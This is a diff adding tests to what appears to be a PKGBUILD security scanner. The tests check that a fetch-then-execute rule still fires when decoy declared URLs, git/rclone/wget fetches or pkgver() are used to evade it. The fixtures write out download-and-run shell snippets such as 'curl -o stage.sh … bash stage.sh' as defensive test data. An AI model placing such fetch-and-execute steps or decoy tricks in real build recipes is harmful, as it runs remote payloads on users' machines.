@@ -235,3 +235,71 @@ def test_a_declared_url_decoy_does_not_silence_a_host_form_fetch():
               " pkgname=demo\n pkgver=1.0\n"
               " source=('https://declared.example/x.tar.gz')\n"))
     assert "H082" in fired
+
+
+# --- list-2 scheme-decoy and pkgver blind spot (0.18.0) -------------------
+
+def _decoy_diff(body: str) -> str:
+    """A recipe whose ``source=()`` declares the decoy URL in play."""
+    return _diff(body).replace(
+        " pkgname=demo\n pkgver=1.0\n",
+        " pkgname=demo\n pkgver=1.0\n"
+        " source=('https://declared.example/decoy.tar.gz')\n")
+
+
+def test_a_declared_url_decoy_does_not_silence_a_git_fetch():
+    assert "H082" in _fired(_decoy_diff(
+        'build() {\n'
+        '  git fetch origin "+refs/heads/main:refs/x" '
+        '"https://declared.example/decoy.tar.gz"\n'
+        '  bash f.erl\n'
+        '}\n'))
+
+
+def test_a_declared_url_decoy_does_not_silence_an_rclone_copy():
+    assert "H082" in _fired(_decoy_diff(
+        'build() {\n'
+        '  rclone copy remote:b/f.erl . '
+        '"https://declared.example/decoy.tar.gz"\n'
+        '  for x in *.erl; do bash "$x"; done\n'
+        '}\n'))
+
+
+def test_a_declared_url_decoy_does_not_silence_a_wget():
+    assert "H082" in _fired(_decoy_diff(
+        'build() {\n'
+        '  wget -q "$(cat /tmp/u)" '
+        '"https://declared.example/decoy.tar.gz"\n'
+        '  bash f.sh\n'
+        '}\n'))
+
+
+def test_a_fetch_inside_pkgver_is_paired():
+    """R051 knows pkgver's network, but not `git pull`; the fetch-then-execute
+    pairing pass must read pkgver, or a payload there pairs with nothing."""
+    assert "H082" in _fired(_diff(
+        'pkgver() {\n'
+        '  git pull origin main\n'
+        '  bash f.sh\n'
+        '}\n'))
+
+
+def test_an_attributed_fetch_with_an_unrelated_execution_is_not_paired():
+    """The decluttered pending rule must not turn every later execution of an
+    undeclared file into a pairing with an earlier, properly-attributed fetch."""
+    fired = _fired(_diff(
+        'build() {\n'
+        '  curl -fsSL -o f.sh https://real.example/f.sh\n'
+        '  bash other.sh\n'
+        '}\n'))
+    assert "H082" not in fired
+
+
+def test_an_explicit_output_on_a_decoy_line_is_still_attributed():
+    """`-o stage.sh` names the file the fetch writes; the declared URL on the
+    same line is irrelevant to that attribution."""
+    assert "H082" in _fired(_decoy_diff(
+        'build() {\n'
+        '  curl -fsSL -o stage.sh "https://declared.example/decoy.tar.gz"\n'
+        '  bash stage.sh\n'
+        '}\n'))
